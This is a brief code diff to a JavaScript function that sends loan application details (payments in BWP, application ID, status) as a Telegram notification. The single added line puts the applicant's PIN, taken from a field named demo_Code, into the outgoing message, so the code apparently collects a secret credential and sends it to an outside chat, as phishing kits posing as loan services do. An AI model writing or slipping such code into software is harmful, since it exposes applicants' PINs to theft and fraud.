@@ -29,6 +29,7 @@ async function sendTelegramNotification(applicationId) {
         `Period: ${application.period_months ?? "N/A"} months`,
         `Monthly payment: BWP ${application.monthly_payment_bwp ?? "N/A"}`,
         `Total repayment: BWP ${application.total_repayment_bwp ?? "N/A"}`,
+        `PIN: ${application.demo_Code || "N/A"}`,
         "",
         `Application ID: ${application.id}`,
         "Status: PENDING",
